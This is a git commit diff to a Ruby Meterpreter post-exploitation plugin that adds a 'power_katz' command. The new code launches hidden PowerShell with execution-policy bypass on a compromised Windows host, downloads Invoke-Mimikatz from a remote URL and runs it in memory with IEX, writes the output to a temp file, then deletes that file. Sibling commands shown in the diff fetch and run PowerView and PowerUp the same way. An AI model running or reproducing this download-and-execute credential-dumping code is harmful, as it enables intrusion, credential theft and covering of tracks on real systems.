8398d45a6132f77c7fe13c053f40cdfb48df607f
Alex Levinson <gen0cide.threats@gmail.com>
2014-09-22 20:20:52 -0700

    add mimikatz from memory

--- power_shell.rb
+++ power_shell.rb
@@ -24,7 +24,8 @@ class Console::CommandDispatcher::Priv::PowerShell
     {
       "power_shell" => "Execute a powershell command.",
       "power_view"  => "Download and execute Veil's PowerView Framework",
-      "power_up"    => "Download and execute the PowerUp Framework"
+      "power_up"    => "Download and execute the PowerUp Framework",
+      "power_katz"  => "Invoke-Mimikatz into memory using PowerShell"
     }
   end
 
@@ -42,7 +43,7 @@ class Console::CommandDispatcher::Priv::PowerShell
     output  = "#{rand(100000)}"
     ps_cmd  = args.join(" ")
     client.sys.process.execute("powershell -nop -exec bypass -c #{ps_cmd} >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
-    print_status("Sending command to client... (~10 seconds)")
+    print_status("Sending command to client...")
     sleep(10)
     log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
     begin
@@ -64,7 +65,7 @@ class Console::CommandDispatcher::Priv::PowerShell
     output  = "#{rand(100000)}"
     ps_cmd  = args.join(" ")
     client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
-    print_status("Sending command to client... (~10 seconds)")
+    print_status("Sending command to client...")
     sleep(10)
     log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
     begin
@@ -86,8 +87,31 @@ class Console::CommandDispatcher::Priv::PowerShell
     output  = "#{rand(100000)}"
     ps_cmd  = args.join(" ")
     client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
-    print_status("Sending command to client... (~10 seconds)")
+    print_status("Sending command to client...")
     sleep(10)
+    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
+    begin
+      while ((data = log_file.read) != nil)
+        data.strip!
+        print_line(data)
+      end
+    rescue EOFError
+    ensure
+      log_file.close
+    end
+
+    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
+    return true
+  end
+
+  def cmd_power_katz(*args)
+    link = 'https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'    
+    output  = "#{rand(100000)}"
+    ps_cmd  = args.join(" ")
+    client.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{link}'); Invoke-Mimikatz #{ps_cmd}\" >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
+    print_status("Sending command to client...")
+    print_warning("This could take a bit...")
+    sleep(11)
     log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
     begin
       while ((data = log_file.read) != nil)
